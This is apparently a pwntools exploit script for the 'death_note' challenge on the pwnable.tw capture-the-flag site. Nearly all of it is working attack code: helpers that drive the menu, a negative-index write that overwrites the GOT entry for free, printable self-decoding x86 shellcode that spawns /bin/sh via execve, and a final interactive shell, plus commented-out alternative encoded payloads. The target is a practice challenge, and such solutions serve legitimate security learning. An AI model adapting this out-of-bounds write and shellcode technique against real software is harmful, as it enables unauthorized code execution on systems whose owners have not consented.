#!python2

from pwn import *

context.terminal = [ "termite", "-e" ]
# p = process("/usr/bin/strace ./challange/death_note", shell=True)
# p = process("./challange/death_note")
p = remote('chall.pwnable.tw', 10201)
# gdb.attach(p,'''
        # # Break on free call
        # break *0x08048873
        # # Start programm
        # c
        # # Skip first free
        # c
        # # Print reloc address
        # p /x *0x0804a014
        # printf "%s\\n", *0x0804a014
        # break **0x0804a014

# ''')


# def insert(payload, index):
    # p.send('1' + 14 * '\x00')
    # p.send(str(index) + (15 - len(str(index))) * '\x00')
    # # p.send(payload)
    # p.send(payload + (80 - len(payload)) * '\x00')

# def delete(index):
    # p.send('3' + 14 * '\x00')
    # p.send(str(index) + (15 - len(str(index))) * '\x00')

def insert(con, idx):
    p.sendline('1')
    p.recvuntil('Index :')
    p.sendline(str(idx))
    p.recvuntil('Name :')
    p.sendline(con)

def delete(index):
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

# A = 'LLLLXPY3E01E01u03u0fXh8eshXf5VJPfhbifhDefXf5AJfPDTYhKATYX5KATYPQTUX3H01H01X0GGGG' # len(A) = 76
# B = '3X0YRX3E01E03U0Jfh2GfXf3E0f1E0f1U0fh88fX0E1f1E0f3E0fPTRX49HHHQfPfYRX2E00E0BRX0E0' # len(B) = 80
# C = '2E02L0z0L0zYRX4j4aGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'
pay = asm('''
/* execve('/bin///sh',0,0)*/

push 0x68       /* h     */
push 0x732f2f2f /* s///  */
push 0x6e69622f /* nib/  */

push esp
pop ebx /*set ebx to point to '/bin///sh'*/


push edx /* edx is 0 */
dec edx
dec edx /*set dl to 0xfe*/


xor [eax+32],dl /*decode int 0x80*/
xor [eax+33],dl /*decode int 0x80 --> 0x7e33 wird zu 0x80cd */

inc edx
inc edx /*recover edx to 0*/

push edx
pop ecx /*set ecx to 0*/

push 0x40
pop eax
xor al,0x4b /*set eax to 0xb*/

/*int 0x80*/
''')+'\x33\x7e'
pay1 = "\x6a\x30\x58\x34\x30\x50\x5a\x48\x66\x35\x41\x30\x66\x35\x73\x4f\x50\x52\x58\x684J4A\x68PSTY\x68UVWa\x68QRPT\x68PTXR\x68binH\x68IQ50\x68shDY\x68Rha0"

insert('Fucked', 5)
delete(5)


insert(pay, -19)
delete(-19)

# insert(A, -19) # -19 * 4 = -76
# insert(B, 0)
# insert(C, 1)

# insert('/bin/sh', 5)
# delete(5)

# p.send('3' + 14 * '\x00')
# p.send(str(5) + (15 - len(str(5))) * '\x00')
# p.interactive(prompt='')
p.interactive()

